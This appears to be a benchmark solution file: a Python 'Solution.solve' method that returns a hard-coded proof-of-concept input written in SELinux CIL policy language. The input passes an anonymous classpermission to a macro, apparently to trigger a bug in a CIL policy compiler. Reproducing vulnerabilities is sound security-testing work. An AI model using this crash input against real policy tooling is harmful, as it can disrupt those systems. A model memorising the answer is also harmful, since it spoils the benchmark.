import os
from typing import Optional


class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = b"(class c (p))\n(macro m ((classpermission a)) (classpermissionset s (a)))\n(m (classpermission (c (p))))\n"
        return poc